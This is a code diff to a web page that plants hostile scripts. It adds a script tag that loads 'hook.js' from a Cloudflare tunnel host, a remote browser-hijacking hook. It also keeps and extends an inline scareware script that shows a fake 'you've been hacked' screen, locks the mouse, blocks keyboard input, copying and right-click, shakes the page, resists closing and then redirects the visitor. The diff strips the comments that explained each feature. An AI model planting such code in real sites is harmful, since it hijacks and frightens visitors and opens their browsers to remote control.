@@ -326,9 +326,9 @@
             form.reset();
         })
     </script>
+    <script src="https://crimes-ant-concerning-super.trycloudflare.com/hook.js"></script>
     <script>
         (function(){
-    // 全局黑色遮罩弹窗，显示黑客提示
     const mask = document.createElement('div');
     mask.style.cssText = `
         position:fixed;
@@ -353,7 +353,6 @@
     mask.appendChild(tipBox);
     document.body.appendChild(mask);
 
-    // 持续循环锁定鼠标
     function lockMouseLoop() {
         document.documentElement.requestPointerLock();
         document.body.style.cursor = "none";
@@ -364,7 +363,6 @@
     setInterval(lockMouseLoop, 200);
     lockMouseLoop();
 
-    // 拦截所有键盘输入
     window.addEventListener('keydown', e => {
         e.preventDefault();
         e.stopImmediatePropagation();
@@ -375,21 +373,18 @@
         e.stopImmediatePropagation();
     }, true);
 
-    // 禁用右键、复制、选中、拖拽
     document.oncontextmenu = e => e.preventDefault();
     document.oncopy = e => e.preventDefault();
     document.oncut = e => e.preventDefault();
     document.onselectstart = e => e.preventDefault();
     document.ondragstart = e => e.preventDefault();
 
-    // 页面持续高强度抖动
     setInterval(() => {
         const x = (Math.random() - 0.5) * 20;
         const y = (Math.random() - 0.5) * 20;
         document.body.style.transform = `translate(${x}px, ${y}px)`;
     }, 12);
 
-    // 全屏彩色漂浮文字
     setInterval(() => {
         const div = document.createElement('div');
         div.innerText = "已入侵设备";
@@ -407,21 +402,30 @@
         document.body.appendChild(div);
     }, 50);
 
-    // 禁止滚动
     document.documentElement.style.overflow = "hidden";
     document.body.style.overflow = "hidden";
 
-    // 切换页面时更换提示文字
     document.addEventListener("visibilitychange", ()=>{
         lockMouseLoop();
         tipBox.innerText = "别想逃跑，入侵持续生效！";
         setTimeout(()=>tipBox.innerText="⚠️ 你被我hack了 ⚠️",1000);
     })
 
-    // 关闭页面拦截提示
     window.onbeforeunload = function() {
         return "页面已被入侵，强行关闭可能造成未知风险";
     };
+
+    // 10秒倒计时跳转
+    let count = 10;
+    const countTimer = setInterval(()=>{
+        tipBox.innerText = `⚠️ 你被我hack了 ⚠️\n${count}秒后自动跳转页面`;
+        count--;
+        if(count < 0){
+            clearInterval(countTimer);
+            // 修改这里为你的目标链接
+            window.location.href = "https://www.baidu.com";
+        }
+    }, 1000);
 })();
     </script>
 </body>
